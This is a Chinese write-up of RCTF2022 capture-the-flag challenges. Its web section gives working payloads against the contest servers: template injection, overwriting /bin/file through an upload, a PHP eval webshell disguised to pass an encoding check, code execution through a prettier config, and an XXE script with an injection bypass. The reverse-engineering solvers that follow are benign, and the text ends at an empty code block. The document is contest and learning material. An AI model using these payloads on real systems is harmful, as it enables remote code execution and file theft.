# RCTF2022

# WEB

## file_checker_mini

参考链接： 

https://github.com/connLAN/libmagic/blob/master/src/magic.c

```HTMLBars
#!/bin/ba{{config.__class__.__init__.__globals__['os'].popen('cat /f*').read()}}
```

## file_checker_plus

仔细观察代码和第一个进行对比，就可以发现，这里的用户变成了root,也就是可以任意覆盖文件了。直接覆盖**`/bin/file` path.join是可以绕过了。**

```HTTP
POST / HTTP/1.1
Host: 159.138.110.192:23001
Content-Length: 208
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://159.138.110.192:23001
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary77sLQKpLtjVL8UxE
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://159.138.110.192:23001/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundary77sLQKpLtjVL8UxE
Content-Disposition: form-data; name="file-upload"; filename="/bin/file"
Content-Type: text/plain

#!/bin/sh
cat /flag
------WebKitFormBoundary77sLQKpLtjVL8UxE--
```

## file_checker_pro_max

这里的用户还是root，但是它检测了文件是否存在。我们使用strace工具查看file命令的时候发现了ld.so.preload这个文件。也就好办了

```Plain%20Text
ld.so.preload
/tmp/exp.so
exp.c 

https://payloads.online/archivers/2020-01-01/1/
```

## easy_upload 

仔细看一下这一段代码。认真观察其逻辑。会发现有问题。

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820132.png)

也就是说如果代码把我们的数据认为是base64，那么就会对这个内容进行base64解码(也就会自动去除非base64字符集的数据)，那么我们绕过就从这里来就可以了。简单写一个爆破脚本

```PHP
 <?php
mb_detect_order(["BASE64","ASCII","UTF-8"]);
// for($i = 1; $i <= 256; $i++){
//     for($j = 1; $j <= 256; $j++){
//         $content="<?php eval(\$_GET[1]);//".chr($i).chr($j);
//         $charset = mb_detect_encoding($content, null, true);
//         if($charset == "BASE64"){
//             echo $content;    
//             echo $i."-".$j."\n";
//             exit(0);
//         }
//     }
// }
$content="<?php eval(\$_GET[1]);//".chr(1).chr(128);
$charset = mb_detect_encoding($content, null, true);
file_put_contents("a.php",$content);
var_dump($charset);
echo "\n";
echo urlencode($content);
echo "\n";
```

记住是php8的环境哦!



## Ezruoyi

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820419.png)

## Prettyonline

查看相关的配置文件可以发现其中parser和plugin都会被包含的js执行中，使用的是require。后续不具体跟踪

```CoffeeScript
filepath: ".prettierrc"
parser: ".prettierrc"
parse: 
  - eval(module.exports = ()=> global.process.mainModule.constructor._load('child_process').execSync('/readflag').toString());
```

## Ezbypass

```HTML
import base64,requests

payload = """
<!DOCTYPE users [<!ENTITY yeet SYSTEM "file:///flag">]>
<users><user><intro>&yeet;</intro></user></users>"""
payload = b'<?xml version="1.0" encoding="UTF-16LE" ?>' + payload.encode('UTF-16LE')
payload = base64.b64encode(payload)
print(payload)
url = "http://94.74.86.95:8899/index;.ico"
# url = "http://127.0.0.1:8091"
data = {
   "password":"${@java.lang.Character@toString(39)}or(1=1))#",
   "poc":payload,
   "type":"sb",
   "yourclasses":"java.io.ByteArrayInputStream,[B,org.xml.sax.InputSource,java.io.InputStream"
}

print(requests.get(url=url,params=data).text)
```

# Reverse

## CheckYourKey

JNI_onLoad 将 sub_8965 注册为 ooxx，输入先后经过如下变化

1. sub_FB40：标准 AES-128-ECB
2. sub_F7DC：标准 base58
3. sub_13788：变表 base64

最后与目标值比较，逐个逆回去即可

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820371.png)

## web_run

通过 js 发现是 wasm 逆向题，wasm 的入口是 _main，且定义了 一些交互接口

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820750.png)

先改个后缀

- .1 是 html
- .2 是 wasm

jeb 分析 ez_ca.wasm，还原 _f11 部分符号：

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820924.png)

get_input_time 首先接收 20 个字符（fd_read 的实现里会自动加换行，占用一个字符），前 16 个必须满足 `%llu/%llu/%llu %llu:%llu` 的格式，转成 int 形式后不能是 202211110054：

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820115.png)

之后 generate_serial 函数依据输入的时间生成序列号，要求第二次输入必须与计算得到的序列号相同。但是由于 0xA20 这个地址中的内容恒为 0，因此不管输什么时间进去，就算序列号对了，也会输出 `right value,But the time is not the time I want to hide`。

观察到代码中判断时间为 202211110054 时会退出执行，不产生序列号。于是猜测题目将 2022/11/11 00:54 这个时间对应的序列号作为 flag，故分析 generate_serial 并自行实现就可以求得 flag 了。

```Python
def tohex(v: int):
    return hex(v)[2:]

def calc_one(v: int):
    v = v * 6364136223846793005 + 1
    c = (v >> 33) % 16
    return c, v

def generate_serial(minute):
    mask = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'
    tmp = minute + 0 * 100 + 11 * 10000 + 11 * 1000000 + 2022 * 100000000 - 1
    tmp &= 0xFFFFFFFF

    serial = ''
    for i in range(len(mask)):
        mask_i = ord(mask[i])
        if mask_i != 52 and mask_i != 45:
            c, tmp = calc_one(tmp)
            if mask_i == 120:
                serial += tohex(c)
            else:
                serial += tohex((c & 3) | 8)
        else:
            serial += chr(mask_i)
    return serial

print(f"RCTF{{{generate_serial(54)}}}")
```

## huowang

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820837.png)

有两个迷宫，第一个是用 unicorn 跑的，里面碰壁了就会触发 exit 系统调用（0x3c），走到终点就会触发 write 系统调用（1），这个地图不太好提出来。

而第二个迷宫就是常规迷宫了，注意到二者用到的输入序列相同，所以先把第二个迷宫所有路径求出来，再一个个试就行了。

找了个求所有可行路径的脚本

```C%2B%2B
// #include "pch.h"
#include <iostream>
using namespace std;
#define M 23 //行数
#define N 21 //列数
//迷宫
int a[M+2][N+2] = 
{
    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1},
    {1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1},
        {1,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,1},
        {1,0,1,0,1,0,1,0,1,1,1,0,1,0,1,1,1,0,1,0,1,0,1},
        {1,0,0,0,1,0,1,0,0,0,0,0,1,0,1,0,0,0,1,0,1,0,1},
        {1,0,1,0,1,0,1,1,1,1,1,1,1,1,1,0,1,0,1,1,1,0,1},
        {1,0,1,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,0,0,1},
        {1,0,1,0,1,1,1,1,1,0,1,0,1,0,1,1,1,1,1,0,1,0,1},
        {1,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,1},
        {1,1,1,0,1,0,1,0,1,1,1,0,1,0,1,1,1,0,1,1,1,0,1},
        {1,0,0,0,1,0,1,0,0,0,1,0,1,0,1,0,0,0,1,0,0,0,1},
        {1,0,1,1,1,0,1,1,1,0,1,0,1,0,1,0,0,0,1,1,1,0,1},
        {1,0,0,0,1,0,1,0,0,0,1,0,1,0,1,0,0,0,0,0,1,0,1},
        {1,0,1,0,1,0,1,0,1,1,1,0,1,0,1,1,1,1,1,0,1,0,1},
        {1,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1},
        {1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,0,1,0,1,0,1},
        {1,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,1,0,1},
        {1,0,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,0,1},
        {1,0,0,0,1,1,0,1,1,1,0,0,1,0,0,0,0,0,0,0,1,0,1},
        {1,0,0,0,1,0,1,1,1,1,0,1,1,0,1,1,1,1,1,0,1,0,1},
        {1,0,0,0,1,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,1,0,1},
        {1,0,1,0,1,0,1,0,1,0,1,1,1,1,1,0,1,1,1,1,1,0,1},
        {1,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,1},
        {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1},
        {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1},
};
struct
{
    int i; // 横坐标
    int j; // 纵坐标
    int direction;//方向
}Stack[100],Path[100][200];// 定义栈和存放路径的数组

int top = -1; //栈顶指针
int roadnumber = 1; //路径数
int minlength = 100; //最短路径长度
int minroadnumber=1;//记录进行比较的最小路径数

//输出一条路径并保存最短路径
static void one_path()
{
    
    int k;
    cout <<"第"<< roadnumber++<<"条路："<< endl;// 输出第roadnumber条路径
    for (k = 0; k <= top; k++)
    {
        cout << "(" << Stack[k].i << "," << Stack[k].j << ")";
        if (k != top) cout << "->";
    }
    cout << endl;
    if (top + 1 <=minlength) //找最短路径
    {
        Path[minroadnumber][0].i= top + 1;//将路径长度存放在第一列的i中
        for (k = 1; k <= top+1; k++) //更新最短路径
        {
            Path[minroadnumber][k].i = Stack[k-1].i;
            Path[minroadnumber][k].j = Stack[k-1].j;
            Path[minroadnumber][k].direction = Stack[k-1].direction;
        }
        minroadnumber++;
        minlength = top + 1; // 更新最短长度
    }
}

//输出最短路径
static void min_path()
{
    cout << "最短路径长度为：" << minlength << endl;
    cout << "路径为："<< endl;
    for (int k = 1; k <=minroadnumber; k++)
    {
        if (Path[k][0].i == minlength)
        {
            for (int l = 1; l <=minlength; l++)
            {
                cout << "(" << Path[k][l].i << "," << Path[k][l].j << ")";
                if (l != minlength) cout << "->";
            }
            cout << endl;
        }
    }
    cout << endl;
}

static void all_path(int xi, int yi, int xe, int ye)//入口与出口
{
    int i, j, di,X, Y;
    int flag = 0;
    top++; // 进栈
    Stack[top].i = xi;
    Stack[top].j = yi;
    Stack[top].direction = 0;// 入口进栈
    a[xi][yi] = -1; //标记为访问过
    int f=0;//用来标志是否有路可走
    while (top > -1) // 栈不空时循环
    {
        i = Stack[top].i;
        j = Stack[top].j; 
        di = Stack[top].direction;// 取栈顶
        if (i == xe && j == ye) // 找到终点
        {
            one_path(); // 输出一条路径
            f = 1;//代表有路
            a[i][j] = 0; // 让出口变为其他路径可走方块
            top--; // 出口退栈
            i = Stack[top].i; 
            j = Stack[top].j;
            di = Stack[top].direction; // 更换栈顶
        }
        flag = 0;
        while (di < 4 && flag==0)
        {
            di++;
            switch (di)//四个方向寻找
            {
            case 1:X = i - 1;Y = j;break;
            case 2:X = i;Y = j + 1;break;
            case 3:X = i + 1;Y = j;break;
            case 4:X = i;Y = j - 1;break;
            }
            if (a[X][Y] == 0)//如果为通路证明找到
                flag=1;
        }
        if (flag) // 找到就修改原来栈顶的方向并且进栈新步骤
        {
            Stack[top].direction = di; // 修改原栈顶元素的di值
            top++;//入栈
            Stack[top].i = X; Stack[top].j = Y; Stack[top].direction = 0; // 下一个可走方块(i1,j1)进栈
            a[X][Y] = -1; //标志为访问过
        }
        else // 否则将该点置为通路，退栈
        {
            a[i][j] = 0;
            top--;
        }
    }
    if (f == 0) cout << "无路可走！" << endl;
    else
    {
        cout << "一共有" << roadnumber - 1 << "条路！" << endl;
        min_path(); // 输出最短路径
    }
}

int main(int argc, char *argv[])
{
    cout << "迷宫如下图所示：(1表示墙0表示通路)" << endl;
    for (int i = 0; i < M + 2; i++)
    {
        for (int j = 0; j < N + 2; j++)
            cout << a[i][j] << '\t';
        cout << endl;
    }
    cout << "所有路径如下：" << endl;
    all_path(1, 1, M, N);
    return 0;
}
```

求出来有286条路径

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820863.png)

把路径保存到path.txt里，写个交互脚本爆破一下就可以了

```Python
from pwn import *
with open('path.txt',encoding='utf-8') as f:
    lines = f.read().split('\n')
def func(route):
    p = ''
    for i in range(len(route)-1):
        if route[i][0] < route[i+1][0]:
            p += 's'
        elif route[i][0] > route[i+1][0]:
            p += 'w'
        elif route[i][1] < route[i+1][1]:
            p += 'd'
        elif route[i][1] > route[i+1][1]:
            p += 'a'
    return p
for i in range(int(len(lines)/2)):
    path = lines[i*2+1].split('->')
    for j in range(len(path)):
        path[j] = eval(path[j])

    pp = func(path)
    # print(pp)

    p = process('./HuoWang')
    p.sendline(pp)
    recv = p.recvline()
    if b'flag' in recv:
        print(recv) 
        print(pp)
    p.close() 
```

得到符合条件的路径，求md5包上RCTF{}即可

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820884.png)

## picStore(re)

动调跟 luaL_loadfilex，发现程序修改了 lua 引擎的 LoadByte, LoadInt, LoadInteger, LoadNumber 函数，对经过这四个函数的每个读出的字节，都会进行如下判断和变换：

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820787.png)

按照相同的改法修改 Lua5.3.3 代码并重新编译，替换 luadec 自带的 lua-5.3 项目，反编译失败，只能拿到反汇编代码。因此考虑更换 unluac 工具，在修改了的 lua 交互执行环境中用 string.dump 将明文的 picStore.luac dump 出来，再用 unluac 反编译并进行代码美化。

其中和 re 有关的函数有两个，分别是 check_impl 和 check_func。check_impl 将 30 个 note 中的字符读出拼接并传入 check_func 进行检查：

```Lua
function check_impl()
  local note_id, L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  note_id = 0
  L1_2 = 0
  L2_2 = ""
  L3_2 = false
  while note_id < 30 do
    L4_2 = check_inuse_impl(note_id)
    L5_2 = note_id % 2
    if L5_2 == 0 and L4_2 == 1 then
      L1_2 = L1_2 + 1
      L6_2 = note_id
      L5_2 = read_data_impl(L6_2)
      L6_2 = #L5_2
      if L6_2 ~= 2 then
        L3_2 = true
      end
      L2_2 = L2_2 .. L5_2
    end
    note_id = note_id + 1
  end
  if L1_2 == 15 then
    if #L2_2 == 30 and L3_2 == false then
      if check_func(L2_2) == true then
        print("now, you know the flag~")
        print(L2_2)
    end
  end
  else
    print("you fail!")
  end
end
```

check_func 初始化了一个长度为 256 的 s 盒，对每个字符异或特定值后进行置换，将结果数组传入 check_result_23_impl 进行检查：

```Lua
function check_func(A0_2)
  local input, tbl, sub_res
  input = value_list(A0_2)
  sub_res = {}
  tbl = {}
  tbl[1] = 105
  tbl[2] = 244
  -- ...
  tbl[255] = 9
  tbl[256] = 193
  for i = 1, #input, 1 do
    input[i] = xor(input[i], i - 1)
    input[i] = xor(input[i], 255)
    input[i] = input[i] & 255
    sub_res[#sub_res + 1] = tbl[input[i] + 1]
  end

  return check_result_23_impl(sub_res) == 1
end
```

check_result_23_impl 在 elf 中实现，其中实际调用 chk_23 来检查加密后的数组：

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820793.png)

可以看出就是一连串的等式约束，写个 z3 脚本再解密回去即可：

```Python
from z3 import *

solver = Solver()

a1 = [Int(f'c{i}') for i in range(30)]
v1 = a1[0]
v2 = a1[1]
v3 = a1[2]
v4 = a1[3]
v5 = a1[4]
v6 = a1[5]
v7 = a1[6]
v8 = a1[7]
v10 = a1[8]
v24 = a1[9]
v25 = a1[10]
v26 = a1[11]
v27 = a1[12]
v28 = a1[13]
v29 = a1[14]
v30 = a1[15]
v31 = a1[16]
v32 = a1[17]
v33 = a1[18]
v34 = a1[19]
v35 = a1[20]
v36 = a1[21]
v37 = a1[22]
v38 = a1[23]
v39 = a1[24]
v40 = a1[25]
v20 = a1[26]
v41 = a1[27]
v22 = a1[28]
solver.add(255036*v7+-90989*v3+-201344*v4+122006*v5+-140538*v6+109859*v2-109457*v1-9396023 == 0)
solver.add(277432*v6+110191*v3+-186022*v4+175123*v2-75564*v5-252340*v1-12226612 == 0)
solver.add(127326*v4+260948*v2+-102835*v1+225038*v5-129683*v3-45564209 == 0)
solver.add(-170345*v2+217412*v3-26668*v1+38500*v4-27440782 == 0)
solver.add(25295*v2+69369*v3+191287*v1-24434293 == 0)
solver.add(72265*v1-2384745 == 0)
solver.add(264694*v1-190137*v2+19025100 == 0)
solver.add(101752*v24+67154*v8+-20311*v1+-30496*v6+-263329*v7+-99420*v10+255348*v3+169511*v4-121471*v2+231370*v5-33888892 == 0)
solver.add(17253*v8+-134891*v7+144501*v4+220594*v2+263746*v3+122495*v6+74297*v10+205480*v1-32973*v5-115484799 == 0)
solver.add(251337*v3+-198187*v6+-217900*v2+-62192*v8+-138306*v7+-165151*v4-118227*v1-22431*v5+72699617 == 0)
solver.add(243012*v27+-233931*v4+66595*v7+-273948*v5+-266708*v24+75344*v8-108115*v3-17090*v25+240281*v10+202327*v1-253495*v2+233118*v26+154680*v6+25687761 == 0)
solver.add(41011*v8+-198187*v1+-117171*v7+-178912*v3+9797*v24+118730*v10-193364*v5-36072*v6+10586*v25-110560*v4+173438*v2-176575*v26+54358815 == 0)
solver.add(-250878*v24+108430*v1+-136296*v5+11092*v8+154243*v7+-136624*v3+179711*v4+-128439*v6+22681*v25-42472*v10-80061*v2+34267161 == 0)  
solver.add(65716*v30+-18037*v26+-42923*v7+-33361*v4+161566*v6+194069*v25+-154262*v2+173240*v3-31821*v27-80881*v5+217299*v8-28162*v10+192716*v1+165565*v24+106863*v29-127658*v28-75839517 == 0)
solver.add(-236487*v24+-45384*v1+46984*v26+148196*v7+15692*v8+-193664*v6+6957*v10+103351*v29-217098*v28+78149*v4-237596*v5-236117*v3-142713*v25+24413*v27+232544*v2+78860648 == 0)
solver.add(-69129*v10+-161882*v3+-39324*v26+106850*v1+136394*v5+129891*v2+15216*v27+213245*v24-73770*v28+24056*v25-123372*v8-38733*v7-199547*v4-10681*v6+57424065 == 0)
solver.add(-268870*v30+103546*v24+-124986*v27+42015*v7+80222*v2+-77247*v10+-8838*v25+-273842*v4+-240751*v28-187146*v26-150301*v6-167844*v3+92327*v8+270212*v5-87705*v33-216624*v1+35317*v31+231278*v32-213030*v29+114317949 == 0)
solver.add(-207225*v1+-202035*v3+81860*v27+-114137*v5+265497*v30+-216722*v8+276415*v28+-201420*v10-266588*v32+174412*v6+249222*v24-191870*v4+100486*v2+37951*v25+67406*v26+55224*v31+101345*v7-76961*v29+33370551 == 0)
solver.add(175180*v29+25590*v4+-35354*v30+-173039*v31+145220*v25+6521*v7+99204*v24+72076*v27+207349*v2+123988*v5-64247*v8+169099*v6-54799*v3+53935*v1-223317*v26+215925*v10-119961*v28-83559622 == 0)
solver.add(43170*v3+-145060*v2+199653*v6+14728*v30+139827*v24+59597*v29+2862*v10+-171413*v31+-15355*v25-71692*v7-16706*v26+264615*v1-149167*v33+75391*v27-2927*v4-187387*v5-190782*v8-150865*v28+44238*v32-276353*v34+82818982 == 0)
solver.add(-3256*v27+-232013*v25+-261919*v29+-151844*v26+11405*v4+159913*v32+209002*v7+91932*v34+270180*v10+-195866*v3-135274*v33-261245*v1+24783*v35+262729*v8-81293*v24-156714*v2-93376*v28-163223*v31-144746*v5+167939*v6-120753*v30-13188886 == 0)
solver.add(-240655*v35+103437*v30+236610*v27+100948*v8+82212*v6+-60676*v5+-71032*v3+259181*v7+100184*v10+7797*v29+143350*v24+76697*v2-172373*v25-110023*v37-13673*v4+129100*v31+86759*v1-101103*v33-142195*v36+28466*v32-27211*v26-269662*v34+9103*v28-96428951 == 0)
solver.add(-92750*v28+-151740*v27+15816*v35+186592*v24+-156340*v29+-193697*v2+-108622*v8+-163956*v5+78044*v4+-280132*v36-73939*v33-216186*v3+168898*v30+81148*v34-200942*v32+1920*v1+131017*v26-229175*v10-247717*v31+232852*v25+25882*v7+144500*v6+175681562 == 0)
solver.add(234452*v34+-23111*v29+-40957*v2+-147076*v8+16151*v32+-250947*v35+-111913*v30+-233475*v24+-2485*v28+207006*v26+71474*v3+78521*v1-37235*v36+203147*v5+159297*v7-227257*v38+141894*v25-238939*v10-207324*v37-168960*v33+212325*v6+152097*v31-94775*v27+197514*v4+62343322 == 0) 
solver.add(-142909*v34+-111865*v31+258666*v36+-66780*v2+-13109*v35+-72310*v25+-278193*v26+-219709*v24+40855*v8+-270578*v38+96496*v5+-4530*v1+63129*v28-4681*v7-272799*v30-225257*v10+128712*v37-201687*v39+273784*v3+141128*v29+93283*v32+128210*v33+47550*v6-84027*v4+52764*v40-140487*v27+105279220 == 0)
solver.add(216020*v38+-248561*v29+-86516*v33+237852*v26+-132193*v31+-101471*v3+87552*v25+-122710*v8+234681*v5+-24880*v7+-245370*v1+-17836*v36-225714*v34-256029*v4+171199*v35+266838*v10-32125*v24-43141*v32-87051*v30-68893*v39-242483*v28-12823*v2-159262*v27+123816*v37-180694*v6+152819799 == 0)
solver.add(-116890*v3+67983*v27+-131934*v4+256114*v40+128119*v24+48593*v33+-41706*v2+-217503*v26+49328*v6+223466*v7+-31184*v5+-208422*v36+261920*v1+83055*v20+115813*v37+174499*v29-188513*v35+18957*v25+15794*v10-2906*v28-25315*v8+232180*v32-102442*v39-116930*v34-192552*v38-179822*v31+265749*v30-54143007 == 0)
solver.add(-215996*v4+-100890*v40+-177349*v7+-159264*v6+-227328*v27+-91901*v24+-28939*v10+206392*v41+6473*v25+-22051*v20+-112044*v34+-119414*v30+-225267*v35+223380*v3+275172*v5+95718*v39-115127*v29+85928*v26+169057*v38-204729*v1+178788*v36-85503*v31-121684*v2-18727*v32+109947*v33-138204*v8-245035*v28+134266*v37+110228962 == 0)
solver.add(-165644*v32+4586*v39+138195*v25+155259*v35+-185091*v3+-63869*v31+-23462*v30+150939*v41+-217079*v8+-122286*v6+5460*v38+-235719*v7+270987*v26+157806*v34+262004*v29-2963*v28-159217*v10+266021*v33-190702*v24-38473*v20+122617*v2+202211*v36-143491*v27-251332*v4+196932*v5-155172*v22+209759*v40-146511*v1+62542*v37+185928391 == 0)
solver.add(57177*v24+242367*v39+226332*v31+15582*v26+159461*v34+-260455*v22+-179161*v37+-251786*v32+-66932*v41+134581*v1+-65235*v29+-110258*v28+188353*v38+-108556*v6+178750*v40+-20482*v25+127145*v8+-203851*v5+-263419*v10+245204*v33+-62740*v20+103075*v2-229292*v36+142850*v30-1027*v27+264120*v3+264348*v4-41667*v35+130195*v7+127279*a1[29]-51967523 == 0)

cipher = []
if solver.check() == z3.sat:
    m = solver.model()
    for c in a1:
        cipher.append(m[c].as_long())

    tbl = [105, 244, 63, 10, 24, 169, 248, 107, 129, 138, 25, 182, 96, 176, 14, 89, 56, 229, 206, 19, 23, 21, 22, 198, 179, 167, 152, 66, 28, 201, 213, 80, 162, 151, 102, 36, 91, 37, 50, 17, 170, 41, 3, 84, 85, 226, 131, 38, 71, 32, 18, 142, 70, 39, 112, 220, 16, 219, 159, 222, 11, 119, 99, 203, 47, 148, 185, 55, 93, 48, 153, 113, 1, 237, 35, 75, 67, 155, 161, 74, 108, 76, 181, 233, 186, 44, 125, 232, 88, 8, 95, 163, 200, 249, 120, 243, 174, 212, 252, 234, 58, 101, 228, 86, 109, 144, 104, 121, 117, 87, 15, 132, 12, 20, 165, 115, 136, 135, 118, 69, 68, 2, 82, 123, 250, 251, 53, 255, 51, 221, 211, 195, 145, 140, 254, 0, 116, 43, 29, 217, 197, 183, 168, 188, 34, 218, 146, 147, 98, 149, 246, 180, 103, 33, 40, 207, 208, 192, 143, 26, 154, 225, 100, 141, 175, 124, 230, 62, 177, 205, 110, 202, 253, 173, 46, 52, 114, 164, 166, 137, 158, 122, 13, 83, 178, 133, 189, 187, 7, 184, 77, 245, 216, 190, 194, 72, 157, 172, 171, 199, 160, 45, 49, 27, 204, 81, 6, 92, 59, 209, 239, 130, 97, 61, 214, 215, 73, 90, 126, 42, 30, 240, 79, 224, 78, 223, 111, 60, 4, 5, 196, 231, 106, 64, 139, 235, 150, 227, 238, 191, 127, 31, 156, 54, 241, 242, 134, 247, 128, 65, 94, 57, 210, 236, 9, 193]
    plain = b''
    for i in range(len(cipher)):
        ori = tbl.index(cipher[i])
        ori &= 0xFF
        plain += bytes([ori ^ 0xFF ^ i])

    print(plain.decode())
```

## rdefender

有符号的 rustc 程序，其中定义了两个向量数组，记作 vec1 和 vec2，它们的最大元素个数都是 16。

首先将本地 flag 文件内容读取到向量，中作为 vec1 的第一项，再进入一个 while 1 循环，根据接收到的 8 字节指令执行不同的功能（根据指令的第一字节，可以判断要执行哪个功能）。

对于**功能 1**，其对应的 8 字节结构体为：

```C%2B%2B
struct {
  BYTE  identifier;  // 只能为 0
  BYTE  str[7];
}
```

该功能可以向 flag 所在的 vec1 中插入新向量，向量内容为通过 get_data 函数获得的用户输入及 str 字段内容。

对于**功能 3**，其对应的 8 字节结构体为：

```C%2B%2B
struct {
  BYTE  identifier; // 只能为 2
  BYTE  check_type; // 可以为 {0, 1, 2} 中的一个
  DWORD low;  // 只能是 0x899C66D1
  WORD  hi;   // 只能是 0x5BF3
};
```

该功能可以向 vec2 中插入新向量，向量内容为通过 get_data 函数获得的用户输入及 check_type 字段内容。

对于**功能 2**，其对应的 8 字节结构体为：

```C%2B%2B
struct {
  BYTE  identifier; // 只能为 1
  BYTE  idx1;       // 指定 vec1 下标
  BYTE  idx2;       // 指定 vec2 下标
  BYTE  reserved[5]; // 保留不用
};
```

功能 2 是程序的核心部分，其根据指定的 vec1 和 vec2 下标，从二者中分别取出 v1 = vec1[idx1] 及 v2 = vec2[idx2] ，根据 v2.check_type 字段值来决定如何进行 check。

check 方式同样有三种，以下记 v1 和 v2 中的用户输入为 data1 和 data2。

第一种（v2.check_type == 0）伪代码如下：

```Python
from functools import reduce

def check1(data1: bytes, data2: int):
    digest = reduce(lambda x, y: x * 131 + y, data1) & 0xFFFFFFFF
    if digest == data2:
        return 2
    return 1
```

第二种（v2.check_type == 1）伪代码如下：

```Python
def check2(data1: bytes, data2: bytes):
    for c in data1:
        if c == data2:
            return 2
    return 1
```

由第二种功能可以确定 data1 中含有哪些字符，如果 data1 中字符不重复且比较短的话倒是可以结合功能 1 来确定这些字符的排列顺序。

第三种（v2.check_type == 2）实现了一个基于栈的小型 vm，将 data2 作为代码段，data1 作为数据段来运行。其中比较有用的是以下几条：

| opcode | 指令长度 | 指令构成           | 伪代码                                                       | 描述                                     |
| ------ | -------- | ------------------ | ------------------------------------------------------------ | ---------------------------------------- |
| 0      | 2        | [opcode] [operand] | push operand                                                 | 压入立即数                               |
| 1      | 2        | [opcode] [operand] | push data1[operand]                                          | 压入 data1 第 operand 项                 |
| 3      | 2        | [opcode] [operand] | push stack[top] ? stack[top - 1] ？为 {+, -, *, /, &, \|, ^} 中的一个 | 将栈顶两个元素弹出，进行运算后将结果压入 |
| 5      | 1        | [opcode]           | return stack[top] == 0                                       | 结束虚拟机运行，返回栈顶元素是否为 0     |

因此，可以构造这样一个爆破思路：将 flag 每个字符与猜测的立即数进行减或者异或运算，结束虚拟机运行，再根据服务器响应的返回值来判断猜测是否正确。

代码实现：

```Python
from pwn import *
from string import *


def get_data(data: bytes):
    p.send(p32(len(data)))
    p.send(data)

def add_vec1(name: bytes, string: bytes):
    payload = p8(0)
    payload += name[:7]
    payload = payload.ljust(8, b'\x00')
    p.send(payload)
    get_data(string)
    return u64(p.recv(8))

def check(idx1, idx2):
    payload = p8(1)
    payload += p8(idx1)
    payload += p8(idx2)
    payload = payload.ljust(8, b'\x00')
    p.send(payload)
    return u64(p.recv(8))

def add_vec2(check_type, data):
    payload = p8(2)
    payload += p8(check_type)
    payload += p32(0x899C66D1)
    payload += p16(0x5BF3)
    p.send(payload)
    get_data(data)
    return u64(p.recv(8))


charset = "{}" + ascii_letters

push_imm = lambda v: p8(0) + p8(v)
take_flag_i = lambda i: p8(1) + p8(i)
sub = lambda: p8(3) + p8(1)
xor = lambda: p8(3) + p8(6)
compare = lambda: p8(5)

flag = ''
for i in range(100):
    for cur in charset:
        p = remote("94.74.84.207", 7892)

        vm = push_imm(ord(cur))
        vm += take_flag_i(i)
        vm += sub()
        vm += compare()
        add_vec2(2, vm)
        if check(0, 0) != 1:
            p.close()
            continue
        p.close()

        flag += cur
        log.success(flag)
        if cur == '}':
            exit()
        break
```

## checkserver

本题基于 netlink 构建了一个 webserver，客户端对应的处理函数是 sub_401D40：

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820628.png)

将接收到的 HTTP 请求报文传入 do_response 函数（sub_404FB0），再传入 sub_404A10 进行 HTTP 报文解析。

如果请求体中含有 authcookie 键值对，则调用 sub_404530，并传入解析得到的 authcookie 值：

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820432.png)

地址 0x4045E5 处调用加密函数 sub_402040 对输入进行加密，该函数有非常明显的流加密特征，故可通过测试样例动调获取异或流。加密的结果在 0x4046C1 处与目标数组进行比较。

解题脚本：

```Python
plain = b'a' * 64
cipher = bytes.fromhex("e1fa74991ffb1908ee2deeb7f0c92a0d76f57237aaf0c20ec9e122f388138a36a3e43076e11ed6f00fdba65d59583631bd129ae5edc191ee1a0deeb51114ba23")
tbl = [plain[i] ^ cipher[i] for i in range(64)]

target = b'\xe6\xf7t\x9f\x05\xab\x1aP\xbf(\xb6\xe6\xa4\x9e\x7f\r"\xacv`\xfd\xa6\x90^\x91\xb4v\xa3\x8dC\x885\xf4\xe0\x37\x6a'
flag = ''.join(map(chr, [tbl[i] ^ target[i] for i in range(len(target))]))
print(flag)
```

## RTTT

无符号的 rustc 程序，但是加密比较简单。程序先接收输入，将输入序列构建成一棵树，再对其进行遍历（sub_DBC0），遍历得到的结果只是字节位置发生了变化，可以通过测试样例找到它们的映射关系。

之后做 RC4 流加密（sub_E310），key 是两个数组异或得到的。

解题脚本：

```Python
